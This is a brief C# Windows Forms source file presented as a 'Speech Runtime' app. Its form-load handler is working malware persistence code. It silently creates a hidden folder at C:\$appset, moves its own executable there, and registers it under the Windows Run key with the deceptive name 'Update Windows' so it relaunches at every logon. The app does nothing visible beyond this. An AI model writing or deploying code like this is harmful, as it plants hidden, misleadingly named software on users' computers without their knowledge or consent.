using System;
using System.IO;
using Microsoft.Win32;
using System.Windows.Forms;

namespace Speech__Runtime
{
    public partial class Form1 : Form
    {     
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {         
           
           Directory.CreateDirectory(@"C:\$appset");

           DirectoryInfo dirInfo = new DirectoryInfo(@"C:\$appset\");
           dirInfo.Attributes = FileAttributes.Hidden;

           File.Move(System.Reflection.Assembly.GetExecutingAssembly().Location, @"C:\$appset\SpeechRun.exe");

           RegistryKey regkey;
           string subKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
           regkey = Registry.CurrentUser.CreateSubKey(subKey);
           regkey.SetValue("Update Windows", "C:\\$appset\\SpeechRun.exe");
           regkey.Close();         
        }
    }
}
